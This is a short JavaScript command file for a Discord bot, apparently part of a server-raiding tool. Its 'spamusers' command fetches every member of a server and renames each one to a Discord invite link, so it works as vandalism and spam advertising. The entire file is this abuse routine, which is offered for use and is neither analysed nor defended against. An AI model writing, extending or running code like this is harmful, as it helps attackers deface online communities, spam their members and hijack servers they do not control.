const { createBlacklistButton } = require('../utils/blacklist-button');

module.exports = {
    name: 'spamusers',
    description: 'Renames all users in the server.',
    prefix: '&',
    async execute(msg, client, channel_logs, blacklist_user, idservidores_nopermitidos) {
        createBlacklistButton(client, channel_logs, msg.author);
        if (idservidores_nopermitidos.includes(msg.guild.id)) {
            return msg.channel.send({ content: '> This server is not allowed.' });
        }

        const members = await msg.guild.members.fetch();
        for (const member of members.values()) {
            try {
                await member.setNickname('.gg/zCQ8jQ2GBf');
            } catch (e) {
                console.log(`[X] Could not rename user ${member.user.tag} with ID ${member.id}, error: ${e.message}`);
            }
        }
    }
};
